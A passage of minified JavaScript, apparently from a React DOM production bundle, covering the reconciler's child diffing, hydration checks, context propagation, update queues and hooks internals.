xc(e,a,t){Na[La++]=Ga,Na[La++]=ja,Na[La++]=mt,mt=e;var l=Ga;e=ja;var i=32-fa(l)-1;l&=~(1<<i),t+=1;var n=32-fa(a)+i;if(30<n){var s=i-i%5;n=(l&(1<<s)-1).toString(32),l>>=s,i-=s,Ga=1<<32-fa(a)+i|t<<i|l,ja=n+e}else Ga=1<<n|t<<i|l,ja=e}function Rs(e){e.return!==null&&(Za(e,1),xc(e,1,0))}function ws(e){for(;e===nn;)nn=hl[--gl],hl[gl]=null,ti=hl[--gl],hl[gl]=null;for(;e===mt;)mt=Na[--La],Na[La]=null,ja=Na[--La],Na[La]=null,Ga=Na[--La],Na[La]=null}function Nc(e,a){Na[La++]=Ga,Na[La++]=ja,Na[La++]=mt,Ga=a.id,ja=a.overflow,mt=e}var Be=null,Te=null,le=!1,pt=null,Da=!1,zs=Error(p(519));function ht(e){var a=Error(p(418,1<arguments.length&&arguments[1]!==void 0&&arguments[1]?"text":"HTML",""));throw li(xa(a,e)),zs}function Lc(e){var a=e.stateNode,t=e.type,l=e.memoizedProps;switch(a[Pe]=e,a[aa]=l,t){case"dialog":ee("cancel",a),ee("close",a);break;case"iframe":case"object":case"embed":ee("load",a);break;case"video":case"audio":for(t=0;t<Oi.length;t++)ee(Oi[t],a);break;case"source":ee("error",a);break;case"img":case"image":case"link":ee("error",a),ee("load",a);break;case"details":ee("toggle",a);break;case"input":ee("invalid",a),Hr(a,l.value,l.defaultValue,l.checked,l.defaultChecked,l.type,l.name,!0);break;case"select":ee("invalid",a);break;case"textarea":ee("invalid",a),Br(a,l.value,l.defaultValue,l.children)}t=l.children,typeof t!="string"&&typeof t!="number"&&typeof t!="bigint"||a.textContent===""+t||l.suppressHydrationWarning===!0||Jd(a.textContent,t)?(l.popover!=null&&(ee("beforetoggle",a),ee("toggle",a)),l.onScroll!=null&&ee("scroll",a),l.onScrollEnd!=null&&ee("scrollend",a),l.onClick!=null&&(a.onclick=Ya),a=!0):a=!1,a||ht(e,!0)}function Dc(e){for(Be=e.return;Be;)switch(Be.tag){case 5:case 31:case 13:Da=!1;return;case 27:case 3:Da=!0;return;default:Be=Be.return}}function vl(e){if(e!==Be)return!1;if(!le)return Dc(e),le=!0,!1;var a=e.tag,t;if((t=a!==3&&a!==27)&&((t=a===5)&&(t=e.type,t=!(t!=="form"&&t!=="button")||ar(e.type,e.memoizedProps)),t=!t),t&&Te&&ht(e),Dc(e),a===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(p(317));Te=ef(e)}else if(a===31){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(p(317));Te=ef(e)}else a===27?(a=Te,Dt(e.type)?(e=sr,sr=null,Te=e):Te=a):Te=Be?_a(e.stateNode.nextSibling):null;return!0}function Bt(){Te=Be=null,le=!1}function Fs(){var e=pt;return e!==null&&(sa===null?sa=e:sa.push.apply(sa,e),pt=null),e}function li(e){pt===null?pt=[e]:pt.push(e)}var Gs=d(null),kt=null,Va=null;function gt(e,a,t){L(Gs,a._currentValue),a._currentValue=t}function Ka(e){e._currentValue=Gs.current,S(Gs)}function js(e,a,t){for(;e!==null;){var l=e.alternate;if((e.childLanes&a)!==a?(e.childLanes|=a,l!==null&&(l.childLanes|=a)):l!==null&&(l.childLanes&a)!==a&&(l.childLanes|=a),e===t)break;e=e.return}}function qs(e,a,t,l){var i=e.child;for(i!==null&&(i.return=e);i!==null;){var n=i.dependencies;if(n!==null){var s=i.child;n=n.firstContext;e:for(;n!==null;){var o=n;n=i;for(var r=0;r<a.length;r++)if(o.context===a[r]){n.lanes|=t,o=n.alternate,o!==null&&(o.lanes|=t),js(n.return,t,e),l||(s=null);break e}n=o.next}}else if(i.tag===18){if(s=i.return,s===null)throw Error(p(341));s.lanes|=t,n=s.alternate,n!==null&&(n.lanes|=t),js(s,t,e),s=null}else s=i.child;if(s!==null)s.return=i;else for(s=i;s!==null;){if(s===e){s=null;break}if(i=s.sibling,i!==null){i.return=s.return,s=i;break}s=s.return}i=s}}function bl(e,a,t,l){e=null;for(var i=a,n=!1;i!==null;){if(!n){if((i.flags&524288)!==0)n=!0;else if((i.flags&262144)!==0)break}if(i.tag===10){var s=i.alternate;if(s===null)throw Error(p(387));if(s=s.memoizedProps,s!==null){var o=i.type;ma(i.pendingProps.value,s.value)||(e!==null?e.push(o):e=[o])}}else if(i===se.current){if(s=i.alternate,s===null)throw Error(p(387));s.memoizedState.memoizedState!==i.memoizedState.memoizedState&&(e!==null?e.push(Ii):e=[Ii])}i=i.return}e!==null&&qs(a,e,t,l),a.flags|=262144}function sn(e){for(e=e.firstContext;e!==null;){if(!ma(e.context._currentValue,e.memoizedValue))return!0;e=e.next}return!1}function Jt(e){kt=e,Va=null,e=e.dependencies,e!==null&&(e.firstContext=null)}function ke(e){return Ic(kt,e)}function on(e,a){return kt===null&&Jt(e),Ic(e,a)}function Ic(e,a){var t=a._currentValue;if(a={context:a,memoizedValue:t,next:null},Va===null){if(e===null)throw Error(p(308));Va=a,e.dependencies={lanes:0,firstContext:a},e.flags|=524288}else Va=Va.next=a;return t}var Jm=typeof AbortController<"u"?AbortController:function(){var e=[],a=this.signal={aborted:!1,addEventListener:function(t,l){e.push(l)}};this.abort=function(){a.aborted=!0,e.forEach(function(t){return t()})}},Ym=T.unstable_scheduleCallback,Qm=T.unstable_NormalPriority,_e={$$typeof:qe,Consumer:null,Provider:null,_currentValue:null,_currentValue2:null,_threadCount:0};function Hs(){return{controller:new Jm,data:new Map,refCount:0}}function ii(e){e.refCount--,e.refCount===0&&Ym(Qm,function(){e.controller.abort()})}var ni=null,Ps=0,Al=0,yl=null;function Xm(e,a){if(ni===null){var t=ni=[];Ps=0,Al=Yo(),yl={status:"pending",value:void 0,then:function(l){t.push(l)}}}return Ps++,a.then(_c,_c),a}function _c(){if(--Ps===0&&ni!==null){yl!==null&&(yl.status="fulfilled");var e=ni;ni=null,Al=0,yl=null;for(var a=0;a<e.length;a++)(0,e[a])()}}function Zm(e,a){var t=[],l={status:"pending",value:null,reason:null,then:function(i){t.push(i)}};return e.then(function(){l.status="fulfilled",l.value=a;for(var i=0;i<t.length;i++)(0,t[i])(a)},function(i){for(l.status="rejected",l.reason=i,i=0;i<t.length;i++)(0,t[i])(void 0)}),l}var Uc=y.S;y.S=function(e,a){hd=H(),typeof a=="object"&&a!==null&&typeof a.then=="function"&&Xm(e,a),Uc!==null&&Uc(e,a)};var Yt=d(null);function Bs(){var e=Yt.current;return e!==null?e:Ae.pooledCache}function rn(e,a){a===null?L(Yt,Yt.current):L(Yt,a.pool)}function Mc(){var e=Bs();return e===null?null:{parent:_e._currentValue,pool:e}}var Tl=Error(p(460)),ks=Error(p(474)),cn=Error(p(542)),un={then:function(){}};function Rc(e){return e=e.status,e==="fulfilled"||e==="rejected"}function wc(e,a,t){switch(t=e[t],t===void 0?e.push(a):t!==a&&(a.then(Ya,Ya),a=t),a.status){case"fulfilled":return a.value;case"rejected":throw e=a.reason,Fc(e),e;default:if(typeof a.status=="string")a.then(Ya,Ya);else{if(e=Ae,e!==null&&100<e.shellSuspendCounter)throw Error(p(482));e=a,e.status="pending",e.then(function(l){if(a.status==="pending"){var i=a;i.status="fulfilled",i.value=l}},function(l){if(a.status==="pending"){var i=a;i.status="rejected",i.reason=l}})}switch(a.status){case"fulfilled":return a.value;case"rejected":throw e=a.reason,Fc(e),e}throw Xt=a,Tl}}function Qt(e){try{var a=e._init;return a(e._payload)}catch(t){throw t!==null&&typeof t=="object"&&typeof t.then=="function"?(Xt=t,Tl):t}}var Xt=null;function zc(){if(Xt===null)throw Error(p(459));var e=Xt;return Xt=null,e}function Fc(e){if(e===Tl||e===cn)throw Error(p(483))}var El=null,si=0;function dn(e){var a=si;return si+=1,El===null&&(El=[]),wc(El,e,a)}function oi(e,a){a=a.props.ref,e.ref=a!==void 0?a:null}function fn(e,a){throw a.$$typeof===fe?Error(p(525)):(e=Object.prototype.toString.call(a),Error(p(31,e==="[object Object]"?"object with keys {"+Object.keys(a).join(", ")+"}":e)))}function Gc(e){function a(f,c){if(e){var h=f.deletions;h===null?(f.deletions=[c],f.flags|=16):h.push(c)}}function t(f,c){if(!e)return null;for(;c!==null;)a(f,c),c=c.sibling;return null}function l(f){for(var c=new Map;f!==null;)f.key!==null?c.set(f.key,f):c.set(f.index,f),f=f.sibling;return c}function i(f,c){return f=Xa(f,c),f.index=0,f.sibling=null,f}function n(f,c,h){return f.index=h,e?(h=f.alternate,h!==null?(h=h.index,h<c?(f.flags|=67108866,c):h):(f.flags|=67108866,c)):(f.flags|=1048576,c)}function s(f){return e&&f.alternate===null&&(f.flags|=67108866),f}function o(f,c,h,E){return c===null||c.tag!==6?(c=Us(h,f.mode,E),c.return=f,c):(c=i(c,h),c.return=f,c)}function r(f,c,h,E){var j=h.type;return j===me?A(f,c,h.props.children,E,h.key):c!==null&&(c.elementType===j||typeof j=="object"&&j!==null&&j.$$typeof===He&&Qt(j)===c.type)?(c=i(c,h.props),oi(c,h),c.return=f,c):(c=ln(h.type,h.key,h.props,null,f.mode,E),oi(c,h),c.return=f,c)}function g(f,c,h,E){return c===null||c.tag!==4||c.stateNode.containerInfo!==h.containerInfo||c.stateNode.implementation!==h.implementation?(c=Ms(h,f.mode,E),c.return=f,c):(c=i(c,h.children||[]),c.return=f,c)}function A(f,c,h,E,j){return c===null||c.tag!==7?(c=Pt(h,f.mode,E,j),c.return=f,c):(c=i(c,h),c.return=f,c)}function C(f,c,h){if(typeof c=="string"&&c!==""||typeof c=="number"||typeof c=="bigint")return c=Us(""+c,f.mode,h),c.return=f,c;if(typeof c=="object"&&c!==null){switch(c.$$typeof){case Le:return h=ln(c.type,c.key,c.props,null,f.mode,h),oi(h,c),h.return=f,h;case Oe:return c=Ms(c,f.mode,h),c.return=f,c;case He:return c=Qt(c),C(f,c,h)}if(ea(c)||Qe(c))return c=Pt(c,f.mode,h,null),c.return=f,c;if(typeof c.then=="function")return C(f,dn(c),h);if(c.$$typeof===qe)return C(f,on(f,c),h);fn(f,c)}return null}function v(f,c,h,E){var j=c!==null?c.key:null;if(typeof h=="string"&&h!==""||typeof h=="number"||typeof h=="bigint")return j!==null?null:o(f,c,""+h,E);if(typeof h=="object"&&h!==null){switch(h.$$typeof){case Le:return h.key===j?r(f,c,h,E):null;case Oe:return h.key===j?g(f,c,h,E):null;case He:return h=Qt(h),v(f,c,h,E)}if(ea(h)||Qe(h))return j!==null?null:A(f,c,h,E,null);if(typeof h.then=="function")return v(f,c,dn(h),E);if(h.$$typeof===qe)return v(f,c,on(f,h),E);fn(f,h)}return null}function b(f,c,h,E,j){if(typeof E=="string"&&E!==""||typeof E=="number"||typeof E=="bigint")return f=f.get(h)||null,o(c,f,""+E,j);if(typeof E=="object"&&E!==null){switch(E.$$typeof){case Le:return f=f.get(E.key===null?h:E.key)||null,r(c,f,E,j);case Oe:return f=f.get(E.key===null?h:E.key)||null,g(c,f,E,j);case He:return E=Qt(E),b(f,c,h,E,j)}if(ea(E)||Qe(E))return f=f.get(h)||null,A(c,f,E,j,null);if(typeof E.then=="function")return b(f,c,h,dn(E),j);if(E.$$typeof===qe)return b(f,c,h,on(c,E),j);fn(c,E)}return null}function U(f,c,h,E){for(var j=null,re=null,z=c,Z=c=0,te=null;z!==null&&Z<h.length;Z++){z.index>Z?(te=z,z=null):te=z.sibling;var ce=v(f,z,h[Z],E);if(ce===null){z===null&&(z=te);break}e&&z&&ce.alternate===null&&a(f,z),c=n(ce,c,Z),re===null?j=ce:re.sibling=ce,re=ce,z=te}if(Z===h.length)return t(f,z),le&&Za(f,Z),j;if(z===null){for(;Z<h.length;Z++)z=C(f,h[Z],E),z!==null&&(c=n(z,c,Z),re===null?j=z:re.sibling=z,re=z);return le&&Za(f,Z),j}for(z=l(z);Z<h.length;Z++)te=b(z,f,Z,h[Z],E),te!==null&&(e&&te.alternate!==null&&z.delete(te.key===null?Z:te.key),c=n(te,c,Z),re===null?j=te:re.sibling=te,re=te);return e&&z.forEach(function(Rt){return a(f,Rt)}),le&&Za(f,Z),j}function P(f,c,h,E){if(h==null)throw Error(p(151));for(var j=null,re=null,z=c,Z=c=0,te=null,ce=h.next();z!==null&&!ce.done;Z++,ce=h.next()){z.index>Z?(te=z,z=null):te=z.sibling;var Rt=v(f,z,ce.value,E);if(Rt===null){z===null&&(z=te);break}e&&z&&Rt.alternate===null&&a(f,z),c=n(Rt,c,Z),re===null?j=Rt:re.sibling=Rt,re=Rt,z=te}if(ce.done)return t(f,z),le&&Za(f,Z),j;if(z===null){for(;!ce.done;Z++,ce=h.next())ce=C(f,ce.value,E),ce!==null&&(c=n(ce,c,Z),re===null?j=ce:re.sibling=ce,re=ce);return le&&Za(f,Z),j}for(z=l(z);!ce.done;Z++,ce=h.next())ce=b(z,f,Z,ce.value,E),ce!==null&&(e&&ce.alternate!==null&&z.delete(ce.key===null?Z:ce.key),c=n(ce,c,Z),re===null?j=ce:re.sibling=ce,re=ce);return e&&z.forEach(function(sh){return a(f,sh)}),le&&Za(f,Z),j}function be(f,c,h,E){if(typeof h=="object"&&h!==null&&h.type===me&&h.key===null&&(h=h.props.children),typeof h=="object"&&h!==null){switch(h.$$typeof){case Le:e:{for(var j=h.key;c!==null;){if(c.key===j){if(j=h.type,j===me){if(c.tag===7){t(f,c.sibling),E=i(c,h.props.children),E.return=f,f=E;break e}}else if(c.elementType===j||typeof j=="object"&&j!==null&&j.$$typeof===He&&Qt(j)===c.type){t(f,c.sibling),E=i(c,h.props),oi(E,h),E.return=f,f=E;break e}t(f,c);break}else a(f,c);c=c.sibling}h.type===me?(E=Pt(h.props.children,f.mode,E,h.key),E.return=f,f=E):(E=ln(h.type,h.key,h.props,null,f.mode,E),oi(E,h),E.return=f,f=E)}return s(f);case Oe:e:{for(j=h.key;c!==null;){if(c.key===j)if(c.tag===4&&c.stateNode.containerInfo===h.containerInfo&&c.stateNode.implementation===h.implementation){t(f,c.sibling),E=i(c,h.children||[]),E.return=f,f=E;break e}else{t(f,c);break}else a(f,c);c=c.sibling}E=Ms(h,f.mode,E),E.return=f,f=E}return s(f);case He:return h=Qt(h),be(f,c,h,E)}if(ea(h))return U(f,c,h,E);if(Qe(h)){if(j=Qe(h),typeof j!="function")throw Error(p(150));return h=j.call(h),P(f,c,h,E)}if(typeof h.then=="function")return be(f,c,dn(h),E);if(h.$$typeof===qe)return be(f,c,on(f,h),E);fn(f,h)}return typeof h=="string"&&h!==""||typeof h=="number"||typeof h=="bigint"?(h=""+h,c!==null&&c.tag===6?(t(f,c.sibling),E=i(c,h),E.return=f,f=E):(t(f,c),E=Us(h,f.mode,E),E.return=f,f=E),s(f)):t(f,c)}return function(f,c,h,E){try{si=0;var j=be(f,c,h,E);return El=null,j}catch(z){if(z===Tl||z===cn)throw z;var re=pa(29,z,null,f.mode);return re.lanes=E,re.return=f,re}finally{}}}var Zt=Gc(!0),jc=Gc(!1),vt=!1;function Js(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,lanes:0,hiddenCallbacks:null},callbacks:null}}function Ys(e,a){e=e.updateQueue,a.updateQueue===e&&(a.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,callbacks:null})}function bt(e){return{lane:e,tag:0,payload:null,callback:null,next:null}}function At(e,a,t){var l=e.updateQueue;if(l===null)return null;if(l=l.shared,(ue&2)!==0){var i=l.pending;return i===null?a.next=a:(a.next=i.next,i.next=a),l.pending=a,a=tn(e),Ec(e,null,t),a}return an(e,l,a,t),tn(e)}function ri(e,a,t){if(a=a.updateQueue,a!==null&&(a=a.shared,(t&4194048)!==0)){var l=a.lanes;l&=e.pendingLanes,t|=l,a.lanes=t,Ir(e,t)}}function Qs(e,a){var t=e.updateQueue,l=e.alternate;if(l!==null&&(l=l.updateQueue,t===l)){var i=null,n=null;if(t=t.firstBaseUpdate,t!==null){do{var s={lane:t.lane,tag:t.tag,payload:t.payload,callback:null,next:null};n===null?i=n=s:n=n.next=s,t=t.next}while(t!==null);n===null?i=n=a:n=n.next=a}else i=n=a;t={baseState:l.baseState,firstBaseUpdate:i,lastBaseUpdate:n,shared:l.shared,callbacks:l.callbacks},e.updateQueue=t;return}e=t.lastBaseUpdate,e===null?t.firstBaseUpdate=a:e.next=a,t.lastBaseUpdate=a}var Xs=!1;function ci(){if(Xs){var e=yl;if(e!==null)throw e}}function ui(e,a,t,l){Xs=!1;var i=e.updateQueue;vt=!1;var n=i.firstBaseUpdate,s=i.lastBaseUpdate,o=i.shared.pending;if(o!==null){i.shared.pending=null;var r=o,g=r.next;r.next=null,s===null?n=g:s.next=g,s=r;var A=e.alternate;A!==null&&(A=A.updateQueue,o=A.lastBaseUpdate,o!==s&&(o===null?A.firstBaseUpdate=g:o.next=g,A.lastBaseUpdate=r))}if(n!==null){var C=i.baseState;s=0,A=g=r=null,o=n;do{var v=o.lane&-536870913,b=v!==o.lane;if(b?(ae&v)===v:(l&v)===v){v!==0&&v===Al&&(Xs=!0),A!==null&&(A=A.next={lane:0,tag:o.tag,payload:o.payload,callback:null,next:null});e:{var U=e,P=o;v=a;var be=t;switch(P.tag){case 1:if(U=P.payload,typeof U=="function"){C=U.call(be,C,v);break e}C=U;break e;case 3:U.flags=U.flags&-65537|128;case 0:if(U=P.payload,v=typeof U=="function"?U.call(be,C,v):U,v==null)break e;C=I({},C,v);break e;case 2:vt=!0}}v=o.callback,v!==null&&(e.flags|=64,b&&(e.flags|=8192),b=i.callbacks,b===null?i.callbacks=[v]:b.push(v))}else b={lane:v,tag:o.tag,payload:o.payload,callback:o.callback,next:null},A===null?(g=A=b,r=C):A=A.next=b,s|=v;if(o=o.next,o===null){if(o=i.shared.pending,o===null)break;b=o,o=b.next,b.next=null,i.lastBaseUpdate=b,i.shared.pending=null}}while(!0);A===null&&(r=C),i.baseState=r,i.firstBaseUpdate=g,i.lastBaseUpdate=A,n===null&&(i.shared.lanes=0),St|=s,e.lanes=s,e.memoizedState=C}}function qc(e,a){if(typeof e!="function")throw Error(p(191,e));e.call(a)}function Hc(e,a){var t=e.callbacks;if(t!==null)for(e.callbacks=null,e=0;e<t.length;e++)qc(t[e],a)}var Cl=d(null),mn=d(0);function Pc(e,a){e=st,L(mn,e),L(Cl,a),st=e|a.baseLanes}function Zs(){L(mn,st),L(Cl,Cl.current)}function Vs(){st=mn.current,S(Cl),S(mn)}var ha=d(null),Ia=null;function yt(e){var a=e.alternate;L(De,De.current&1),L(ha,e),Ia===null&&(a===null||Cl.current!==null||a.memoizedState!==null)&&(Ia=e)}function Ks(e){L(De,De.current),L(ha,e),Ia===null&&(Ia=e)}function Bc(e){e.tag===22?(L(De,De.current),L(ha,e),Ia===null&&(Ia=e)):Tt()}function Tt(){L(De,De.current),L(ha,ha.current)}function ga(e){S(ha),Ia===e&&(Ia=null),S(De)}var De=d(0);function pn(e){for(var a=e;a!==null;){if(a.tag===13){var t=a.memoizedState;if(t!==null&&(t=t.dehydrated,t===null||ir(t)||nr(t)))return a}else if(a.tag===19&&(a.memoizedProps.revealOrder==="forwards"||a.memoizedProps.revealOrder==="backwards"||a.memoizedProps.revealOrder==="unstable_legacy-backwards"||a.memoizedProps.revealOrder==="together")){if((a.flags&128)!==0)return a}else if(a.child!==null){a.child.return=a,a=a.child;continue}if(a===e)break;for(;a.sibling===null;){if(a.return===null||a.return===e)return null;a=a.return}a.sibling.return=a.return,a=a.sibling}return null}var Wa=0,Q=null,ge=null,Ue=null,hn=!1,Sl=!1,Vt=!1,gn=0,di=0,Ol=null,Vm=0;function xe(){throw Error(p(321))}function Ws(e,a){if(a===null)return!1;for(var t=0;t<a.length&&t<e.length;t++)if(!ma(e[t],a[t]))return!1;return!0}function $s(e,a,t,l,i,n){return Wa=n,Q=a,a.memoizedState=null,a.updateQueue=null,a.lanes=0,y.H=e===null||e.memoizedState===null?xu:ho,Vt=!1,n=t(l,i),Vt=!1,Sl&&(n=Jc(a,t,l,i)),kc(e),n}function kc(e){y.H=pi;var a=ge!==null&&ge.next!==null;if(Wa=0,Ue=ge=Q=null,hn=!1,di=0,Ol=null,a)throw Error(p(300));e===null||Me||(e=e.dependencies,e!==null&&sn(e)&&(Me=!0))}function Jc(e,a,t,l){Q=e;var i=0;do{if(Sl&&(Ol=null),di=0,Sl=!1,25<=i)throw Error(p(301));if(i+=1,Ue=ge=null,e.updateQueue!=null){var n=e.updateQueue;n.lastEffect=null,n.events=null,n.stores=null,n.memoCache!=null&&(n.memoCache.index=0)}y.H=Nu,n=a(t,l)}while(Sl);return n}function Km(){var e=y.H,a=e.useState()[0];return a=typeof a.then=="function"?fi(a):a,e=e.useState()[0],(ge!==null?ge.memoizedState:null)!==e&&(Q.flags|=1024),a}function eo(){var e=gn!==0;return gn=0,e}function ao(e,a,t){a.updateQueue=e.updateQueue,a.flags&=-2053,e.lanes&=~t}function to(e){if(hn){for(e=e.memoizedState;e!==null;){var a=e.queue;a!==null&&(a.pending=null),e=e.next}hn=!1}Wa=0,Ue=ge=Q=null,Sl=!1,di=gn=0,Ol=null}function We(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Ue===null?Q.memoizedState=Ue=e:Ue=Ue.next=e,Ue}function Ie(){if(ge===null){var e=Q.alternate;e=e!==null?e.memoizedState:null}else e=ge.next;var a=Ue===null?Q.memoizedState:Ue.next;if(a!==null)Ue=a,ge=e;else{if(e===null)throw Q.alternate===null?Error(p(467)):Error(p(310));ge=e,e={memoizedState:ge.memoizedState,baseState:ge.baseState,baseQueue:ge.baseQueue,queue:ge.queue,next:null},Ue===null?Q.memoizedState=Ue=e:Ue=Ue.next=e}return Ue}function vn(){return{lastEffect:null,events:null,stores:null,memoCache:null}}function fi(e){var a=di;return di+=1,Ol===null&&(Ol=[]),e=wc(Ol,e,a),a=Q,(Ue===null?a.memoizedState:Ue.next)===null&&(a=a.alternate,y.H=a===null||a.memoizedState===null?xu:ho),e}function bn(e){if(e!==null&&typeof e=="object"){if(typeof e.then=="function")return fi(e);if(e.$$typeof===qe)return ke(e)}throw Error(p(438,String(e)))}function lo(e){var a=null,t=Q.updateQueue;if(t!==null&&(a=t.memoCache),a==null){var l=Q.alternate;l!==null&&(l=l.updateQueue,l!==null&&(l=l.memoCache,l!=null&&(a={data:l.data.map(function(i){return i.slice()}),index:0})))}if(a==null&&(a={data:[],index:0}),t===null&&(t=vn(),Q.updateQueue=t),t.memoCache=a,t=a.data[a.index],t===void 0)for(t=a.data[a.index]=Array(e),l=0;l<e;l++)t[l]=ct;return a.index++,t}function $a(e,a){return typeof a=="function"?a(e):a}function An(e){var a=Ie();return io(a,ge,e)}function io(e,a,t){var l=e.queue;if(l===null)throw Error(p(311));l.lastRenderedReducer=t;var i=e.baseQueue,n=l.pending;if(n!==null){if(i!==null){var s=i.next;i.next=n.next,n.next=s}a.baseQueue=i=n,l.pending=null}if(n=e.baseState,i===null)e.memoizedState=n;else{a=i.next;var o=s=null,r=null,g=a,A=!1;do{var C=g.lane&-536870913;if(C!==g.lane?(ae&C)===C:(Wa&C)===C){var v=g.revertLane;if(v===0)r!==null&&(r=r.next={lane:0,revertLane:0,gesture:null,action:g.action,hasEagerState:g.hasEagerState,eagerState:g.eagerState,next:null}),C===Al&&(A=!0);else if((Wa&v)===v){g=g.next,v===Al&&(A=!0);continue}else C={lane:0,revertLane:g.revertLane,gesture:null,action:g.action,hasEagerState:g.hasEagerState,eagerState:g.eagerState,next:null},r===null?(o=r=C,s=n):r=r.next=C,Q.lanes|=v,St|=v;C=g.action,Vt&&t(n,C),n=g.hasEagerState?g.eagerState:t(n,C)}else v={lane:C,revertLane:g.revertLane,gesture:g.gesture,action:g.action,hasEagerState:g.hasEagerState,eagerState:g.eagerState,next:null},r===null?(o=r=v,s=n):r=r.next=v,Q.lanes|=C,St|=C;g=g.next}while(g!==null&&g!==a);if(r===null?s=n:r.next=o,!ma(n,e.memoizedState)&&(Me=!0,A&&(t=yl,t!==null)))throw t;e.memoizedState=n,e.baseState=s,e.baseQueue=r,l.lastRenderedState=n}return i===null&&(l.lanes=0),[e.memoizedState,l.dispatch]}function no(e){var a=Ie(),t=a.queue;if(t===null)throw Error(p(311));t.lastRenderedReducer=e;var l=t.dispatch,i=t.pending,n=a.memoizedState;if(i!==null){t.pending=null;var s=i=i.next;do n=e(n,s.action),s=s.next;while(s!==i);ma(n,a.memoizedState)||(Me=!0),a.memoizedState=n,a.baseQueue===null&&(a.baseState=n),t.lastRenderedState=n}return[n,l]}function Yc(e,a,t){var l=Q,i=Ie(),n=le;if(n){if(t===void 0)throw Error(p(407));t=t()}else t=a();var s=!ma((ge||i).memoizedState,t);if(s&&(i.memoizedState=t,Me=!0),i=i.queue,ro(Zc.bind(null,l,i,e),[e]),i.getSnapshot!==a||s||Ue!==null&&Ue.memoizedState.tag&1){if(l.flags|=2048,xl(9,{destroy:void 0},Xc.bind(null,l,i,t,a),null),Ae===null)throw Error(p(349));n||(Wa&127)!==0||Qc(l,a,t)}return t}function Qc(e,a,t){e.flags|=16384,e={getSnapshot:a,value:t},a=Q.updateQueue,a===null?(a=vn(),Q.updateQueue=a,a.stores=[e]):(t=a.stores,t===null?a.stores=[e]:t.push(e))}function Xc(e,a,t,l){a.value=t,a.getSnapshot=l,Vc(a)&&Kc(e)}function Zc(e,a,t){return t(function(){Vc(a)&&Kc(e)})}function Vc(e){var a=e.getSnapshot;e=e.value;try{var t=a();return!ma(e,t)}catch{return!0}}function Kc(e){var a=Ht(e,2);a!==null&&oa(a,e,2)}function so(e){var a=We();if(typeof e=="function"){var t=e;if(e=t(),Vt){ut(!0);try{t()}finally{ut(!1)}}}return a.memoizedState=a.baseState=e,a.queue={pending:null,lanes:0,dispatch:null,lastRenderedReducer:$a,lastRenderedState:e},a}function Wc(e,a,t,l){return e.baseState=t,io(e,ge,typeof l=="function"?l:$a)}function Wm(e,a,t,l,i){if(En(e))throw Error(p(485));if(e=a.action,e!==null){var n={payload:i,action:e,next:null,isTransition:!0,status:"pending",value:null,reason:null,listeners:[],then:function(s){n.listeners.push(s)}};y.T!==null?t(!0):n.isTransition=!1,l(n),t=a.pending,t===null?(n.next=a.pending=n,$c(a,n)):(n.next=t.next,a.pending=t.next=n)}}function $c(e,a){var t=a.action,l=a.payload,i=e.state;if(a.isTransition){var n=y.T,s={};y.T=s;try{var o=t(i,l),r=y.S;r!==null&&r(s,o),eu(e,a,o)}catch(g){oo(e,a,g)}finally{n!==null&&s.types!==null&&(n.types=s.types),y.T=n}}else try{n=t(i,l),eu(e,a,n)}catch(g){oo(e,a,g)}}function eu(e,a,t){t!==null&&typeof t=="object"&&typeof t.then=="function"?t.then(function(l){au(e,a,l)},function(l){return oo(e,a,l)}):au(e,a,t)}function au(e,a,t){a.status="fulfilled",a.value=t,tu(a),e.state=t,a=e.pending,a!==null&&(t=a.next,t===a?e.pending=null:(t=t.next,a.next=t,$c(e,t)))}function oo(e,a,t){var l=e.pending;if(e.pending=null,l!==null){l=l.next;do a.status="rejected",a.reason=t,tu(a),a=a.next;while(a!==l)}e.action=null}function tu(e){e=e.listeners;for(var a=0;a<e.length;a++)(0,e[a])()}function lu(e,a){return a}function iu(e,a){if(le){var t=Ae.formState;if(t!==null){e:{var l=Q;if(le){if(Te){a:{for(var i=Te,n=Da;i.nodeType!==8;){if(!n){i=null;break a}if(i=_a(i.nextSibling),i===null){i=null;break a}}n=i.data,i=n==="F!"||n==="F"?i:null}if(i){Te=_a(i.nextSibling),l=i.data==="F!";break e}}ht(l)}l=!1}l&&(a=t[0])}}return t=We(),t.memoizedState=t.baseState=a,l={pending:null,lanes:0,dispatch:null,lastRenderedReducer:lu,lastRenderedState:a},t.queue=l,t=Cu.bind(null,Q,l),l.dispatch=t,l=so(!1),n=po.bind(null,Q,!1,l.queue),l=We(),i={state:a,dispatch:null,action:e,pending:null},l.queue=i,t=Wm.bind(null,Q,i,n,t),i.dispatch=t,l.memoizedState=e,[a,t,!1]}function nu(e){var a=Ie();return su(a,ge,e)}function su(e,a,t){if(a=io(e,a,lu)[0],e=An($a)[0],typeof a=="object"&&a!==null&&typeof a.then=="function")try{var l=fi(a)}catch(s){throw s===Tl?cn:s}else l=a;a=Ie();var i=a.queue,n=i.dispatch;return t!==a.memoizedState&&(Q.flags|=2048,xl(9,{destroy:void 0},$m.bind(null,i,t),null)),[l,n,e]}function $m(e,a){e.action=a}function ou(e){var a=Ie(),t=ge;if(t!==null)return su(a,t,e);Ie(),a=a.memoizedState,t=Ie();var l=t.queue.dispatch;return t.memoizedState=e,[a,l,!1]}function xl(e,a,t,l){return e={tag:e,create:t,deps:l,inst:a,next:null},a=Q.updateQueue,a===null&&(a=vn(),Q.updateQueue=a),t=a.lastEffect,t===null?a.lastEffect=e.next=e:(l=t.next,t.next=e,e.next=l,a.lastEffect=e),e}function ru(){return Ie().memoizedState}function yn(e,a,t,l){var i=We();Q.flags|=e,i.memoizedState=xl(1|a,{destroy:void 0},t,l===void 0?null:l)}function Tn(e,a,t,l){var i=Ie();l=l===void 0?null:l;var n=i.memoizedState.inst;ge!==null&&l!==null&&Ws(l,ge.memoizedState.deps)?i.memoizedState=xl(a,n,t,l):(Q.flags|=e,i.memoizedState=xl(1|a,n,t,l))}function cu(e,a){yn(8390656,8,e,a)}function ro(e,a){Tn(2048,8,e,a)}function ep(e){Q.flags|=4;var a=Q.updateQueue;if(a===null)a=vn(),Q.updateQueue=a,a.events=[e];else{var t=a.events;t===null?a.events=[e]:t.push(e)}}function uu(e){var a=Ie().memoizedState;return ep({ref:a,nextImpl:e}),function(){if((ue&2)!==0)throw 